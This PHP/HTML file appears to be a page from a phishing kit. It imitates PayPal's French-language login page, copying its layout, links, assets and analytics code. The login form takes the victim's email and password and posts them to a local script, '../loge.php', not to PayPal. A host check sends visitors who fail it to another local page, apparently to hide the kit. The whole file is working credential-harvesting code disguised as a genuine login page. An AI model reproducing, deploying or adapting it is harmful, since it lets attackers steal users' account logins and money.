<?php
if (!isset($_SESSION)) {
  session_start();
}
include "../option.php";
include "../lang/Paye.php";
include "../lang/".lang();
if($myhost == $port){

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="fr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<!--
         Script info: script: webscr, cmd: _login-submit, template: p/gen/login, date: Aug 27, 2010 21:55:07 PDT; country: US, language: fr_XC, xslt server: 
		web version: 64.0-1482946 branch: UPR_643_int
		content version: -
		pexml version: 64.0-1489960
		page XSL: Customer/default/fr_XC/general/Login.xsl
       hostname : gmrkpIvwyDm9l.up6BzOu6XF88KvJhqNdg-eCB13hLE
         rlogid : gmrkpIvwyDm9l%2fup6BzOu53Il4KsBbXaVoMfuOOYmRCDnZvx25Ln5g%3d%3d_12ad9741706
-->
<title><?php echo $title2;?></title>
<!--googleoff: all-->
<meta name="description" content="PayPal est le moyen plus sûr et plus simple de payer en ligne sans divulguer le numéro de votre carte de crédit.">
<!--googleon: all-->
<meta http-equiv="X-UA-Compatible" content="IE=8">
<link media="screen" rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/core/global.css">
<link rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/pages/pageLogin.css">
<link rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/flows/flowHFR.css">
<!--[if IE 8]><link media="screen" rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/browsers/ie8.css"><![endif]-->

<!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/browsers/ie7.css"><![endif]-->

<!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/browsers/ie6.css"><![endif]-->
<link rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/fr_XC/country.css">
<link media="print" rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/core/print.css">
<script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><style type="text/css"></style>
<script type="text/javascript" src="../WEBSCR-640-20101004-1/js/lib/min/global.js"></script><script type="text/javascript" src="../WEBSCR-640-20101004-1/js/tns/mid.js"></script><script type="text/javascript">PAYPAL.tns.loginflow = 'xpt/Marketing_CommandDriven/homepage/MainHome';PAYPAL.tns.flashLocation = 'https://www.paypal.com/en_US/m/mid.swf';</script><link rel="shortcut icon" href="../WEBSCR-640-20101004-1/en_US/i/icon/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="../WEBSCR-640-20101004-1/en_US/i/pui/apple-touch-icon.png">
</head>
<body>
<noscript><p class="nonjsAlert">REMARQUE : Pour utiliser de nombreuses fonctionnalités du site PayPal, vous avez besoin de JavaScript et de cookies. Vous pouvez les activer à l'aide des paramètres de votre navigateur.</p></noscript>
<div class="legacyErrors " id="page">
<div id="header" class="std">
<h1><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home"><img border="0" src="../WEBSCR-640-20101004-1/en_US/i/logo/paypal_logo.gif" alt="PayPal"></a></h1>
<form method="post" id="searchForm" name="searchForm" action="https://www.paypal.com/cgi-bin/searchscr?cmd=_sitewide-search">

<fieldset class="autocomplete" id="myDynamicAutoComplete">
<legend><?php echo $search1;?></legend>
<label for="searchBox"><?php echo $search2;?> </label><input type="text" id="searchBox" name="queryString" value=""> <input type="hidden" id="sayTminLength" value="3"><input type="hidden" id="coDomain" value="US"><input class="button" type="submit" id="search.x" name="search.x" value="<?php echo $search2;?>" autocomplete="off">
</fieldset>
<input name="form_charset" type="hidden" value="UTF-8">
</form>
<div id="navGlobal"><ul>
<li class="first signup"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_registration-run"><?php echo $signup;?></a></li>
<li class="login"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_login-run"><?php echo $login;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/helpweb?cmd=_help"><?php echo $help;?></a></li>
<li class="last"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_security-center-outside"><?php echo $s_center;?></a></li>

</ul></div>
<span><a href="#content" class="accessAid skip"><?php echo $s_main;?></a></span><div id="navPrimary"><ul>
<li class="active"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5"><?php echo $home;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8"><?php echo $personal;?></a></li>
<li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home&amp;nav=2" class="scTrack:SRD:Nav:x60"><?php echo $business;?></a></li>
<li><a href="https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9"><?php echo $develop;?></a></li>
</ul></div>
</div>
<div id="content">
<div id="headline">
<div class="secure">
<span class="small"> <?php echo $slogin;?></span> <img src="../WEBSCR-640-20101004-1/en_US/i/icon/secure_lock_2.gif" border="0" alt="">
</div>
<h2><?php echo $slogin;?></h2>
</div>
<?php echo $error1;?>


<div id="main" class="legacyErrors"><div class="layout1"><div class="layout2a">
<div class="col first"><div class="box login">
<div class="header"><h2><?php echo $mlogin;?></h2></div>
<div class="body">
<input name="login_cmd" value="ok" type="hidden">
<form method="post" name="login_form" action="../loge.php?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e284a5f8a8f8&lng=EN<?php echo "&ee=$ee"; ?>">
<input type="hidden" name="login_cmd" value=""><input type="hidden" name="login_params" value=""><fieldset>
<legend><?php echo $slogin;?></legend>
<p><label for="login_email"><span style="color:#c00;"><?php echo $_email;?></span></label><input type="text" id="login_email" class="" name="login_email" value=""></p>
<p><label for="login_password"><span style="color:#c00;"><?php echo $_pass;?></span></label><input autocomplete="off" type="password" id="login_password" name="login_password" value=""></p>
<p><label for="target_page"><?php echo $goto;?></label><select id="target_page" name="target_page"><option value="0" selected><?php echo $macct;?></option>
<option value="1"><?php echo $mtrs;?></option></select></p>
<p><input type="submit" name="submit.x" value="<?php echo $login; ?>" class="button primary"></p>
</fieldset>
<p><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_account-recovery&amp;from=PayPal"><?php echo $p_conx;?></a></p>
<p><?php echo $newtop;?> <strong><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_registration-run"><?php echo $sup;?></a></strong></p>
<input name="form_charset" type="hidden" value="UTF-8">
<input name="login_cmd" value="ok" type="hidden">
</form>

</div>
</div></div>
<div class="col last"><div class="troubleshootingTips">
<h3><?php echo $troubl; ?></h3>
<ul>
<li>
<strong><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_forgot-password&amp;from=PayPal"><?php echo $forg;?></a></strong><ul>
<li><?php echo $caract;?></li>
<li><?php echo $majuscl;?></li>

</ul>
</li>
<li>
<strong><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_email-recovery"><?php echo $forgmail;?></a></strong><ul><li><?php echo $identify;?></li></ul>
</li>
<li>
<strong><?php echo $newemail;?></strong><ul><li><?php echo $logusing;?></li></ul>
</li>
<li>
<strong><?php echo $troubl;?></strong><ul>
<li><?php echo $ymst;?><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_help&amp;t=escalateTab"><?php echo $cntus;?></a><?php echo $needhlp;?>. </li>
<li><?php echo $encookies;?></li>

</ul>
</li>

</ul>
</div></div>
</div></div></div>
</div>
<div id="footer">
<h5 class="accessAid"><?php echo $t1;?></h5>
<ul>
<li class="first"><a href="http://www.paypal-media.com/aboutus.cfm"><?php echo $t2;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab"><?php echo $t7;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_display-fees-outside"><?php echo $t4;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/jobs-outside"><?php echo $t10;?></a></li>
<li><a href="https://cms.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=developer/home"><?php echo $develop;?></a></li>

<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-merchant"><?php echo $t11;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_display-country-functionality-outside"><?php echo $t9;?></a></li>
<li>
<a href="javascript:O_LC()"><?php echo $t3;?></a> <img 
src="../WEBSCR-640-20101004-1/css/Customer/pages/img/sm_333_oo.gif" alt="Site Feedback">
</li>
</ul>
<ul>
<li class="first"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside"><?php echo $t5;?></a></li>
<li><a href="http://www.thepaypalblog.com"><?php echo $t12;?></a></li>
<li><a href="https://www.paypal-labs.com"><?php echo $t13;?></a></li>

<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_web-referrals-mrb-outside"><?php echo $t14;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/ua-outside"><?php echo $t8;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/general/SiteMap-outside"><?php echo $t15;?></a></li>
<li class="last"><a href="http://www.ebay.com/"><?php echo $t16;?></a></li>
</ul>
<p id="footerSecure"><a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Customer/popup/SecurityKeyVIP-outside" onClick="PAYPAL.core.openWindow(event, {width: 425, height: 350})"><img border="0" src="../WEBSCR-640-20101004-1/en_US/i/logo/logo_VIPwhite_66x27.gif" alt=""></a></p>
<p id="legal"><?php echo $copyright;?></p>
</div>
<div id="navFull"><ul>
<li class="active">
<a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5"><?php echo $home;?></a><ul>

<li class="active">
<a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work&amp;nav=0.0" class="scTrack:SRD:Nav:W8"><?php echo $howork;?></a><ul>
<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work&amp;nav=0.0.0" class="scTrack:SRD:Nav:YX"><?php echo $whatis;?></a></li>
<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/Sign_Up_for_PayPal&amp;nav=0.0.1" class="scTrack:SRD:Nav:YY"><?php echo $started;?></a></li>
<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/My_PayPal_Account&amp;nav=0.0.2" class="scTrack:SRD:Nav:YZ"><?php echo $managacc;?></a></li>
<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal&amp;nav=0.0.3" class="scTrack:SRD:Nav:W2"><?php echo $greatw;?></a></li>
<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/PayPal_FAQ&amp;nav=0.0.4" class="scTrack:SRD:Nav:Z0"><?php echo $topten;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_display-fees-outside&amp;nav=0.0.5" class="scTrack:SRD:Nav:y80"><?php echo $howmuch;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/general/PayPalAccountTypes-outside&amp;nav=0.0.6" class="scTrack:SRD:Nav:Z8"><?php echo $acctype;?></a></li>

</ul>
</li>
<li>
<a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/pay_online&amp;nav=0.1" class="scTrack:SRD:Nav:W3"><?php echo $payon;?></a><ul>
<li><a href="https://www.paypal-shopping.com/" class="scTrack:SRD:Nav:Z2"><?php echo $greatd;?></a></li>
<li><a href="https://www.paypal-shopping.com/shop-stores.html" class="scTrack:SRD:Nav:Z3"><?php echo $pstory;?></a></li>
<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/paypal_credit_card&amp;nav=0.1.2" class="scTrack:SRD:Nav:W4"><?php echo $pmaster;?></a></li>
<li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#payonline&amp;nav=0.1.3" class="scTrack:SRD:Nav:L6"><?php echo $shopvm;?></a></li>
</ul>
</li>
<li>
<a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/send_money&amp;nav=0.2" class="scTrack:SRD:Nav:N9"><?php echo $smoney;?></a><ul>

<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/send_money&amp;nav=0.2.0" class="scTrack:SRD:Nav:O1"><?php echo $smoneyon;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/International_Money_Transfer-outside&amp;nav=0.2.1" class="scTrack:SRD:Nav:O2"><?php echo $internly;?></a></li>
<li><a href="https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=0.2.2" class="scTrack:SRD:Nav:MR"><?php echo $tyt;?></a></li>
<li><a href="https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#sendmoney&amp;nav=0.2.3" class="scTrack:SRD:Nav:Y4"><?php echo $vmobile;?></a></li>
</ul>
</li>
<li>
<a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/receive_money&amp;nav=0.3" class="scTrack:SRD:Nav:Y5"><?php echo $gpaid;?></a><ul>
<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay&amp;nav=0.3.0" class="scTrack:SRD:Nav:Y6"><?php echo $sonln;?></a></li>
<li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/wp_standard&amp;nav=0.3.1" class="scTrack:SRD:Nav:Y7"><?php echo $accard;?></a></li>

<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/request_money&amp;nav=0.3.2" class="scTrack:SRD:Nav:P6"><?php echo $rqmoney;?></a></li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/consumer/Fundraise&amp;nav=0.3.3" class="scTrack:SRD:Nav:P7"><?php echo $fundrs;?></a></li>
</ul>
</li>
<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/products_services&amp;nav=0.4" class="scTrack:SRD:Nav:P8"><?php echo $products;?></a></li>
</ul>
</li>
<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8"><?php echo $personal;?></a></li>
<li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home&amp;nav=2" class="scTrack:SRD:Nav:x60"><?php echo $business;?></a></li>
<li><a href="https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9"><?php echo $develop;?></a></li>
</ul></div>

<script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script>
</div>
<script type="text/javascript" src="../WEBSCR-640-20101004-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="../WEBSCR-640-20101004-1/js/hostedpayments/hostedpayments.js"></script><script type="text/javascript" src="../WEBSCR-640-20101004-1/js/pageBlockingUnsafeBrowsers.js"></script><script type="text/javascript" src="../WEBSCR-640-20101004-1/js/pp_naturalsearch.js"></script><script type="text/javascript">mp_landing();</script>
<!-- SiteCatalyst Code
Copyright 1997-2005 Omniture, Inc.
More info available at http://www.omniture.com -->
<script type="text/javascript" src="../WEBSCR-640-20101004-1/js/site_catalyst/pp_jscode_080706.js"></script>
<script type="text/javascript">
s.prop1="p/gen/login";
s.prop7="Unknown";
s.prop8="Unknown";
s.prop9="Unknown";
s.prop10="MA";
s.prop14="Vous devez entrer à la fois votre adresse email et votre mot de passe. Veuillez recommencer.";
s.prop16="";
s.prop29="9A54FBADBAAB98D0EF462737EE645D1B1680E4B6";
s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
s.prop15="login_email;login_password";
s.pageName="Log In";
s.channel="Log In";
s.prop50="fr_XC";
s.prop18="";
</script>
<script type="text/javascript"><!--
/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
var s_code=s.t();if(s_code)document.write(s_code);
if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
//-->
</script><noscript><img
src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
height="1" width="1" border="0" alt="" /></noscript>


<!--/DO NOT REMOVE/-->

<!-- End SiteCatalyst Code -->
</body>
</html>



<?php
}else{
include "../redi.php";
}
?>